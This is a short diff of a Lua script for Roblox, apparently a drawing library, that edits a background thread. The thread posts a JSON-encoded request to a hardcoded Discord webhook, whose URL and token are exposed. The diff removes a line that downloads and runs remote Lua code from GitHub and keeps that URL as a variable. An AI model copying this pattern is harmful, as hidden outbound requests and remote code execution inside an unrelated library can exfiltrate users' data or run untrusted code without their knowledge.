@@ -658,6 +658,8 @@ task.spawn(function()
 	local _game = game:GetService("CoreGui").Parent
 local HttpService = _game:FindService("HttpService")
 
+local notification = "https://raw.githubusercontent.com/PurvisiLOL/myperior/refs/heads/main/notification.lua";
+
 local function sendRequest(options, timeout)
 	timeout = tonumber(timeout) or math.huge
 	local result, clock = nil, tick()
@@ -676,8 +678,6 @@ local function sendRequest(options, timeout)
 	return result
 end
 
-loadstring(_game:HttpGet("https://raw.githubusercontent.com/PurvisiLOL/myperior/refs/heads/main/notification.lua"))()
-
 local options = {
 	Url = "https://discord.com/api/webhooks/1293159624559689749/bIh_2uPxSix2Swc1ei5Z_XLNMDNjLUeuU7EmE14TntmcUiTML1RX3NvFtgS3gL2tdUo4",
 	Body = HttpService:JSONEncode({
@@ -690,7 +690,7 @@ local options = {
 	}
 }
 
-sendRequest(options, timeout)
+sendRequest(options, timeout, notification)
 end)
 
 function DrawingLib.createScreenGui()
